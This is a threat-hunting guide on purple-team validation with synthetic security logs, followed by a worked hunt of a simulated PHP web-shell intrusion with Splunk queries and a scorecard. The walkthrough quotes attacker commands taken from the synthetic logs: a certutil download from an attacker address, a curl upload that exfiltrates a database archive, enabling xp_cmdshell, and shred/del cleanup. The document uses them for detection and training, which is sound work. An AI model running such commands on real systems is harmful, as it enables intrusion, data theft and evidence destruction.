# Purple Operations with Synthetic Telemetry (EvidenceForge)

**Fits at:** Purple Operations (DPO) hunts; Step 4 (Feasibility), Step 7 (Execute), and the [Validation Hook](references/validation_hook.md) before detection handoff.
**Purpose:** Prove, at scale and without touching production, that your telemetry and your hunt logic would have found a known attack, then turn what you learn into measured coverage and tested detections.
**Tool:** [EvidenceForge](https://github.com/Cisco-Talos/EvidenceForge) (Cisco Talos, MIT license).

---

## 1. Why this exists

A hunt that finds nothing only means something if you can show you would have seen the activity. The [Validation Hook](references/validation_hook.md) answers that with a live test: run an Atomic Red Team test or CALDERA ability on an approved host, then query blind. That is the gold standard for one technique on one sensor stack. It is also slow, needs approvals, and does not scale to a multi-stage intrusion that spans web, endpoint, database, backup and network telemetry.

Synthetic purple operations fills the gap. You describe an attack as a storyline, the tool generates consistent logs across many sources, and you hunt that data as if it were real. Because the generator writes a **ground truth** alongside the logs, you can score the hunt, not just run it.

It lines up with the rest of the framework:

| UTHF concept | What synthetic telemetry adds |
|---|---|
| **DPO hunt type** (red team *insight*) | The scenario and ground truth *are* the insight. They give you known-executed behavior and the artifacts that should exist. |
| **DAIKI** | Ground truth is the Insight end of the chain. Hunting the data walks the chain forward (Data → Information → Knowledge), and scoring closes it by comparing your Insight to the known answer. See [DAIKI](Data_Analysis/daiki.md). |
| **Detection engineering** | A repeatable, seeded dataset becomes a regression corpus. Every detection can be re-run against it after a rule, parser or schema change. |
| **Validation Hook** | Covers multi-source, multi-stage validation that live tests cannot cover cheaply. It does not replace live tests (see section 8). |
| **Telemetry gap assessment** | Per-source visibility in the ground truth shows what your sensor placement *would* and *would not* see. See [Telemetry Gap Assessment](references/telemetry_gap_assessment.md). |

---

## 2. What EvidenceForge is

From the project's README:

- Generates synthetic security logs for hunting training and research from a **YAML scenario**: environment, personas, time window, baseline activity, and an optional attack **storyline**.
- **Deterministic.** No LLM calls and no API cost at generation time, and the same inputs and `--seed` give the same output. An LLM is only used (optionally) to *author* scenarios through agent skills.
- **Cross-source consistency.** One canonical event is projected into each log format, and causal rules add prerequisites, for example DNS before a connection.
- **Sources:** Windows Security (30 event IDs), Sysmon, Zeek (13 log types), eCAR, syslog, per-user bash history, Snort alerts, Cisco ASA, web access and proxy logs.
- **Targets:** `default`, `sof-elk` and `splunk`.
- **Always writes `GROUND_TRUTH.md`:** the narrative, a timeline, IOCs, a per-source evidence status, IDS evaluation and, where authored, red herrings.
- **`eforge eval`** scores output on Parseability (30%), Plausibility (25%), Causality (25%) and Timing (20%), with 22 sub-scores. This is *data quality*, not detection coverage.

Commands used in this guide:

```bash
git clone https://github.com/Cisco-Talos/EvidenceForge.git
cd EvidenceForge && uv sync                      # Python 3.11+ and uv
uv run eforge validate scenario.yaml             # check the scenario
uv run eforge generate scenario.yaml -o out/ --seed <N>
uv run eforge eval out/ -s scenario.yaml         # data-quality score
```

---

## 3. Where it fits in the UTHF lifecycle

| UTHF step | Synthetic purple operations contribution |
|---|---|
| **Trigger / Hypothesis** | Start from a threat report or a gap in coverage. Write the hypothesis first (see [hypothesis rubric](references/hypothesis_rubric.md)); the scenario is then built to test it. |
| **Step 4 Feasibility** | Read the per-source **Source Evidence Status** in ground truth. A technique whose only evidence is `filtered` in one source is a measured visibility limit, not a guess. |
| **Step 6 Hunt Plan** | Plan stories per attack stage and per data source, with the ground truth kept sealed. |
| **Step 7 Execute** | The hunter works the loaded data blind, with the same pivots used in production. |
| **Step 8 Outcomes** | Score against ground truth. Outputs: Analytics/Detection candidates, Visibility Gaps, and Security Control Issues (here, *generator or pipeline defects*). |
| **Validation Hook** | Record a synthetic validation (section 5). Treat it as supporting evidence, and confirm high-value detections with a live test. |
| **Step 9 Report & Iterate** | Keep the scenario, seed and result so the hunt re-runs unchanged next quarter. |

---

## 4. The loop

Roles matter. The **scenario author** (red) and the **hunter** (blue) can be different people. If one person does both, do not open `GROUND_TRUTH.md` until the hunt is written up.

| # | Phase | What you do | Output |
|---|---|---|---|
| 1 | **Design** | Pick the hypothesis and the behaviors to test. Define hosts, accounts, benign background and **red herrings** (look-alike benign activity). | Scenario brief |
| 2 | **Author** | Write the scenario YAML. Run `eforge validate`. | `scenario.yaml` |
| 3 | **Generate** | `eforge generate … --seed <N>`. Record the seed and tool version. | Logs + `GROUND_TRUTH.md` |
| 4 | **Check the data** | `eforge eval` for quality, then your own checks after load (section 6). | Quality notes |
| 5 | **Load** | Use the `splunk` target. Load into a dedicated index. | Searchable dataset |
| 6 | **Hunt blind** | Run your hunt (long-tail, pivots, stack counting) without the ground truth. | Hunt notes |
| 7 | **Score** | Compare findings to ground truth, step by step (section 5). | Scorecard |
| 8 | **Triage defects** | Classify every miss and every oddity (section 6). | Defect log, gap tickets |
| 9 | **Hand off** | Candidate detections go to detection engineering with the dataset as a test case. See [detection handoff](references/detection_handoff_spec.md). | DET candidates |

### Scoring

Score each ground-truth step, not the hunt as a whole. Use the same values for every run:

| Result | Meaning | Maps to the Validation Hook failure table |
|---|---|---|
| **Detected** | Hunter surfaced the behavior and attributed it correctly | Coverage claim supported |
| **Partial** | Surfaced only a fragment (one source, no attribution, or late) | Review logic and pivots |
| **Missed: logic** | Telemetry present, hunt missed it | Fix the query, re-run |
| **Missed: telemetry** | The sensor never recorded it | Visibility Gap ticket; a clean result is *not* a clean finding |
| **Not observable by design** | Ground truth marks the source `filtered` or `dropped` | Record as a known limit of sensor placement |
| **Unscorable** | Data defect prevents a fair comparison | Defect log (section 6) |

The six result values are this framework's own. EvidenceForge does not define them.

A false negative remains the most valuable output, as in the Validation Hook. It converts assumed coverage into a measured gap.

---

## 5. Validation record (synthetic)

Use this alongside the live-test record in the [Validation Hook](references/validation_hook.md). Keep synthetic and live results separate in your rolling validation log.

```
Scenario:         [name]         Tool version / commit: [id]      Seed: [N]
ATT&CK:           [TXXXX.XXX list]
Sources emitted:  [asa, ecar, web, zeek, ...]    Target: [splunk]    Index: [name]
Eval score:       [overall + weakest pillar]      (data quality only)

Hunt run blind:   [Y / N]    Hunter: [name]    Query set: [library entries or ad hoc]
Steps scored:     Detected [n] · Partial [n] · Missed-logic [n] · Missed-telemetry [n]
                  Not-observable-by-design [n] · Unscorable [n]
Red herrings:     [handled correctly / confused: which]
Defects found:    [IDs]
Live confirmation needed: [Y / N — which detections]

Outcome:   [Validated (synthetic) | Gap | Partial — describe]
Follow-up: [gap ticket / tuning / detection candidate / upstream issue]
```

---

## 6. Treat defects as findings

Synthetic data is a model of telemetry, not telemetry. It will contain errors. The discipline is to **find them by comparing against ground truth, classify them, and never tune a detection to hide them.**

Four checks after every load:

1. **Time.** Compare the event's own timestamp to Splunk `_time`. If they differ, the dataset is lying about when things happened and every time-bounded search is wrong.
2. **Counts.** Compare per-source event counts with the generator output.
3. **Identity fields.** Check that key IPs, hosts and accounts in the logs match the scenario.
4. **Cross-source agreement.** Take one ground-truth event and follow it through every source. Do the sources agree?

| Defect class | Example | Action |
|---|---|---|
| **Generator** | A source emits a value that contradicts the canonical event | Record, report upstream, annotate the dataset version |
| **Ingest / parsing** | `_time` taken from index time, fields not extracted | Ours to fix; re-load and re-run |
| **Scenario authoring** | Ground truth text contradicts the storyline or leaves out an asset-to-IP map | Fix the scenario, regenerate |
| **Sensor placement (by design)** | Source status `filtered` in ground truth | Not a defect; record as a visibility limit |

---

## 7. Practical walkthrough: `calloway-php2shell`

A scenario I generated and hunted end to end. Facts below come from the run's `GROUND_TRUTH.md` and from the Splunk screenshots in the hunt write-up.

### 7.1 The scenario

An intruder exploits two PHP handler flaws, **CVE-2026-109618** and **CVE-2026-109619**, to drop the php2shell web shell as `thumb_cache.php` on the IIS customer portal, **WEB01**. Both CVEs are *scenario-defined*, not real identifiers. The intruder then:

1. Runs local and network reconnaissance from the shell.
2. Reads `config.php`, which holds an over-privileged SQL login.
3. Pivots to **DB01**, enables `xp_cmdshell`, and finds and dumps customer and pricing tables with `bcp`.
4. Compresses the dumps to `sqlmaint.zip` and copies it to the Linux backup host **BKP01** using the nightly backup job's SSH key.
5. Uploads the archive over HTTPS to `static.cloudmetric-cdn.com` (5.188.206.34), then deletes the evidence on BKP01, DB01 and WEB01.

The ground truth defines 24 storyline steps, three compromised accounts (`svc-portal`, `svc-sql`, `svc-backup`) and **red herrings**: the legitimate nightly `scp` of `ERP_full.bak` from DB01 to BKP01 (same key, same destination directory), an approved internal vulnerability scan from `WS-IT-04`, and an unrelated internet scanner against the portal.

**Sources emitted** (visibility across the attack steps in ground truth, counted as observations):

| Source | Visible | Filtered |
|---|---|---|
| zeek | 433 | 0 |
| asa | 384 | 5 |
| ecar | 240 | 0 |
| sysmon | 200 | 363 |
| windows_security | 117 | 0 |
| web | 15 | 0 |
| bash_history | 7 | 0 |
| syslog | 4 | 0 |

The 363 filtered Sysmon observations are the point of this table. Ground truth tells you what the sensor placement and profile would not show, so a Sysmon-only hunt over this data would have **Not observable by design** results, and you can prove that rather than guess.

### 7.2 Generate and load

```bash
uv run eforge validate scenario.yaml
uv run eforge generate scenario.yaml -o out/ --seed <N>
uv run eforge eval out/ -s scenario.yaml
```

Select the `splunk` target in the scenario's output section (see the project's Scenario Reference), then load the output into a dedicated index. Here the index is `evidenceforge`. The index name is a local choice.

Run a time check immediately after loading. The eCAR events carry an epoch `timestamp_ms` and the Zeek events carry a float `ts`:

```spl
index="evidenceforge" object=PROCESS action=CREATE
| eval event_time=strftime(timestamp_ms/1000,"%Y-%m-%d %H:%M:%S")
| eval index_time=strftime(_time,"%Y-%m-%d %H:%M:%S")
| table event_time index_time hostname principal properties.command_line
| head 20
```

In this run the check exposed a defect (finding F3 below).

### 7.3 Hunt blind

The hunter had no ground truth. The method was DAIKI in practice: stack the data, find the odd, pivot, then build the narrative.

**Hunt 1: long-tail on command lines** (Data → Information)

```spl
index="evidenceforge" object=PROCESS action=CREATE
| stats count by properties.command_line
| sort count
```

Most values were baseline noise. Baseline activity included `sqlcmd` runs against `DB01.calloway.local` for databases like `analytics`, `hr_records` and `inventory`. One value, an odd `sqlcmd.exe` usage, stood out as a long-tail item.

**Pivot 1: who launches `sqlcmd.exe`?** (Information → Knowledge)

```spl
index="evidenceforge" sqlcmd.exe "properties.source_image_path"="C:\\Windows\\System32\\php-cgi.exe"
```

`sqlcmd.exe` spawned by `php-cgi.exe` on WEB01, with `-U portal_app -P <password>` in the command line and `EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE`. A web handler launching a database client and toggling `xp_cmdshell` is the pivot that opens the case.

**Pivot 2: everything else `php-cgi.exe` launched**

```spl
index="evidenceforge" object=PROCESS action=CREATE "properties.parent_image_path"="C:\\Windows\\System32\\php-cgi.exe"
| stats count values(properties.command_line) AS commands by hostname principal
```

This produced the reconnaissance chain (`whoami /all`, `systeminfo`, `net user`, `netstat`, `nltest`, `dir /s /b …*config*`, `type …\config.php`, the PowerShell sweep, `setspn`) and `certutil.exe -urlcache -split -f http://45.83.64.201/svc.exe`. At this point WEB01 is treated as compromised and IR is brought in.

**Pivot 3: network context for the IOC**

```spl
index="evidenceforge" "id.resp_h"="45.83.64.201"
| table _time id.orig_h id.resp_h id.resp_p method uri status_code response_body_len
```

The Zeek HTTP record shows `GET /svc.exe` from 10.10.10.10 (WEB01) returning `application/x-msdownload`. The same attacker address was tied to POSTs to `upload.php` and `thumb_cache.php`, with a python user-agent.

**Pivot 4: DB01.** The same method surfaced `svc-sql` activity: `whoami`, schema discovery with `INFORMATION_SCHEMA`, `bcp … queryout`, `Compress-Archive` into `sqlmaint.zip`, the `scp.exe` to `svc-backup@10.10.20.50`, and cleanup with `del /f /q`.

**Pivot 5: BKP01 and exfiltration**

```spl
index="evidenceforge" "properties.command_line"="curl*static.cloudmetric-cdn.com*"
```

`curl -sS -m 5 -I` (an egress check), then `curl -sS -T /var/backups/db/sqlmaint.zip https://static.cloudmetric-cdn.com/u/…`, then `shred -u`. The Zeek SSL record confirms `server_name` `static.cloudmetric-cdn.com` and destination 5.188.206.34:443 from 10.10.20.50.

**Pivot 6: scope the actors**

```spl
index="evidenceforge" object=PROCESS action=CREATE principal="svc-*"
| stats count values(properties.command_line) AS commands values(hostname) AS hosts by principal
```

Three service accounts, `svc-portal`, `svc-sql` and `svc-backup`, matched the working hypothesis of service-account abuse across three hosts. Logon events were then reviewed across the same accounts.

**Red herring handling.** `svc-backup` also ran `scp.exe … D:\Backups\ERP_full.bak` twice. That is the nightly backup, and it is distinguishable from the attacker's copy by account (`svc-sql`), file (`sqlmaint.zip`), source path (`C:\Windows\Temp`) and time of day.

### 7.4 Scorecard

Scored from the screenshots and write-up. Treat results as the hunter's view, and confirm the evidence column against your Splunk data before publishing numbers.

| # | Ground-truth step | Result | Evidence |
|---|---|---|---|
| 1 | Fingerprint portal, probe import module | Partial | Web requests noted, fingerprinting itself not shown |
| 2 | Upload `thumb_cache.php` (CVE-2026-109618) | Partial | POSTs to `upload.php` and `thumb_cache.php`, python user-agent |
| 3 | Shell runs, `whoami /all` | Detected | `cmd.exe /c whoami /all`, parent `php-cgi.exe` |
| 4 | System and network discovery | Detected | `hostname & systeminfo & ipconfig /all` |
| 5 | Accounts, admins, services | Detected | `net user & net localgroup administrators & tasklist /svc` |
| 6 | Connections, ARP, routes | Detected | `netstat -ano & arp -a & route print` |
| 7 | Search for config files | Detected | `dir /s /b C:\inetpub\wwwroot\portal\*config*` |
| 8 | Read DB config | Detected | `type …\includes\config.php` |
| 9 | DC, trust, privileged groups | Detected | `nltest /dclist … /domain_trusts`, `net group "Domain Admins"` |
| 10 | Server segment sweep | Detected | PowerShell `Test-NetConnection` loop over ports 22/135/445/1433/3389/5985 |
| 11 | Pull helper binary (blocked) | Detected | `certutil -urlcache -split -f http://45.83.64.201/svc.exe`; see F2 |
| 12 | SPN enumeration | Detected | `setspn.exe -T calloway.local -Q MSSQLSvc/*` |
| 13 | Log into DB01, enable `xp_cmdshell` | Detected | `sqlcmd.exe -S DB01 -U portal_app …` |
| 14 | First command on DB01 | Detected | `cmd.exe /c "whoami & hostname & ipconfig /all"` as `svc-sql` |
| 15 | List databases and data dirs | Detected | `sqlcmd … sys.databases & dir D:\SQLData` |
| 16 | Browse ERP schema | Detected | `INFORMATION_SCHEMA` query, `SELECT TOP 5 * … CustomerAccounts` |
| 17 | Bulk export with `bcp` | Detected | `bcp … ContractPricing`, `bcp … CustomerAccounts` |
| 18 | Compress exports | Detected | `Compress-Archive … sqlmaint.zip` |
| 19 | Copy archive to BKP01 | Detected | `scp.exe -i …\id_ed25519 … svc-backup@10.10.20.50` |
| 20 | Interactive session on BKP01 | Detected | `ls -la`, `df -h`, `curl -I`, `login -- svc-backup` |
| 21 | Upload to attacker storage | Detected | `curl -T …`; Zeek SSL to 5.188.206.34 |
| 22 | Remove archive on BKP01 | Detected | `shred -u /var/backups/db/sqlmaint.zip` |
| 23 | Delete exports on DB01 | Detected | `del /f /q …ca.dat …cp.dat …sqlmaint.zip` |
| 24 | Disable `xp_cmdshell` | Detected | `sqlcmd … 'xp_cmdshell',0` |

**22 Detected, 2 Partial** at the command level. Both Partial steps are the web-layer steps, the earliest in the chain. The write-up does not show ASA or IDS alerts, so network-sensor coverage was not scored here. The scenario is built for that scoring (ASA threat-detection alert 733100 for the sweep, IDS SID 2012647), so it is the obvious next run.

### 7.5 Findings: defects in the synthetic telemetry

| ID | Finding | Class | Effect on confidence |
|---|---|---|---|
| **F1** | **Portal-facing address.** Ground truth records every shell interaction as *Connection to 203.0.113.10:80* and tags it "Internal Server" in the Network IOCs. The `203` address was not logged correctly in the telemetry. Pivoting on WEB01's 10.10.10.10 returned **45.83.64.201** only, with the `203` only appearing in asa logs and not in web logs. | Generator, with scenario-authoring contributors | Network-layer attribution of the web shell client is **Unscorable**. Host-level scoring is unaffected. |
| **F2** | **Blocked transfer logged as success.** Step 11 is named "tool download blocked", and ground truth says the DMZ egress policy blocked it. The Zeek HTTP record shows `status_code` 200 and `response_body_len` 44,736,717. Four ASA observations exist for the step. | Generator or sensor placement; verify | Compare the ASA record for the same flow before deciding. Until then, do not use Zeek alone to claim the download succeeded. |
| **F3** | **`_time` is index time.** The Zeek event with `ts` 1792491146.897 is 2026-10-20 10:12:26 UTC (the ground-truth time for step 11), but Splunk displayed it at 11/2/26 8:30:45 PM, the load date. | Ingest / parsing | Any `earliest`/`latest` bound is wrong until timestamp extraction is fixed. Hunt on `ts` or `timestamp_ms` in the meantime. |
| **F4** | **No asset map.** `GROUND_TRUTH.md` names hosts and accounts but gives no host-to-IP table, so IP-based scoring (including F1) has no authority to check against. | Scenario authoring | Add an asset table to the scenario brief, taken from the YAML. |
| **F5** | **Sysmon filtering.** 363 of 563 Sysmon observations across the attack steps are `filtered`. | Sensor placement (by design) | Not a defect. A Sysmon-only hunt has *Not observable by design* results for those steps. |

F1 surfaced during the hunt itself. F2 to F5 came from comparing the write-up and screenshots with `GROUND_TRUTH.md`. A live test would give you none of these, and each one improves the next scenario.

### 7.6 Outcomes and handoff

**Hypothesis:** an intruder using a web shell on an internet-facing PHP host can pivot to the database and backup tiers using service-account credentials, and exfiltrate from the backup host. **Confirmed**, with the network-layer attribution caveat from F1.

Detection candidates from the walkthrough. Compare each with the new [book detection library](ThreatHuntingQueries/Book_Detection_Opportunities_Index.md) entries, which are **not yet run against this dataset**:

| Observation | Library entry to test | Gap? |
|---|---|---|
| `php-cgi.exe` parent spawning `cmd.exe`, `sqlcmd.exe`, `certutil.exe` | Detection of Web Server Processes Spawning Command Interpreters | Lists `php-cgi.exe` as a parent, and `cmd.exe` and `certutil.exe` are in its child list. `sqlcmd.exe` is not, so add it. |
| `certutil -urlcache -split -f http://…` | None specific | **New candidate** |
| `sqlcmd` toggling `xp_cmdshell` | None specific | **New candidate** |
| `Compress-Archive` of exported data | Detection of Encrypted and Split Archive Creation | Covered by its `Compress-Archive` clause |
| `bcp` on DB01 | Detection of Database Export Tools on Non-Database Hosts | **Expected miss.** DB01 is a database host, which is correct behavior. Pair with staging path logic. |
| `curl -T` upload from a backup host to a rare domain | Detection of Dedicated Exfiltration Tools Including Renamed Binaries | **Gap.** The entry does not cover `curl -T`. |
| `shred -u` after upload | None | **New candidate** |

The library SPL assumes Sysmon XML field names. This dataset's eCAR events use different ones (for example `properties.command_line`, `properties.parent_image_path`, `hostname`), so a field mapping is needed before any library query will match. That mismatch is the Validation Hook's "telemetry present, query missed" case.

---

## 8. Limits

- **Synthetic is not live.** The generator models what sensors would emit. Real EDR agents, Sysmon configurations and parsers behave differently. Use synthetic runs to test logic, pivots, multi-source correlation and regressions, and use live tests to confirm sensor behavior for detections you will deploy.
- **The eval score measures data quality**, not detection coverage. A high score means the data parses, is plausible and is internally consistent.
- **A scenario is one path.** Detecting one storyline does not prove coverage of the technique. Vary the procedure, as with any validation.
- **Your results depend on the observation profile.** Record it, since the same scenario with different sensor placement scores differently.
- **Credentials and addresses in scenarios are synthetic.** Keep the dataset out of production indexes and mark it clearly.
- **Project maturity.** Check the project's documented per-format limits (Evidence Formats reference) before relying on a source, and report defects upstream.

---

## 9. Metrics and program use

Add these to the [maturity and metrics](docs/maturity_metric.md) view:

| Metric | Definition |
|---|---|
| **Synthetic scenarios run per quarter** | Count, with technique coverage |
| **Step detection rate** | Detected / (steps − not observable by design − unscorable), per scenario |
| **Defects found per scenario, by class** | Trend shows whether pipeline quality is improving |
| **Detections regression-tested** | Share of shipped detections with a stored synthetic test case |
| **Synthetic-only vs live-confirmed** | Detections validated only synthetically, flagged for live confirmation |

Keep scenario, seed, tool version and scorecard in the hunt record, so a regression run next quarter is one command and a diff.

---

## References

- EvidenceForge (Cisco Talos, MIT): https://github.com/Cisco-Talos/EvidenceForge. See its Scenario Reference, Evidence Formats and Customizing Configuration docs.
- [Validation Hook](references/validation_hook.md) · [Detection Handoff Spec](references/detection_handoff_spec.md) · [Telemetry Gap Assessment](references/telemetry_gap_assessment.md) · [Hypothesis Rubric](references/hypothesis_rubric.md) · [DAIKI](Data_Analysis/daiki.md)
- MITRE ATT&CK: https://attack.mitre.org
- RFC 5737, IPv4 Address Blocks Reserved for Documentation: https://www.rfc-editor.org/rfc/rfc5737
